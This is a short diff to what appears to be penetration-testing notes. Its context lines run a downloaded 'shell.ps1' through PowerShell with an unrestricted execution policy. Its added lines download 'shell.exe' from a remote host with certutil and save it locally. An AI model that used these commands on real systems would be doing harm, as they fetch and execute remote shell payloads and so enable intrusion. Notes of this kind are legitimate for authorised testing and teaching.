@@ -100,3 +100,7 @@ Execute the downloaded file through powershell:
 
 powershell -ExecutionPolicy Unrestricted -File C:\Users\admin\Desktop\shell.ps1
 
+Transfer file using certutil: 
+
+certutil.exe -urlcache -split -f "http://10.12.14.13:8000/shell.exe" s.exe
+
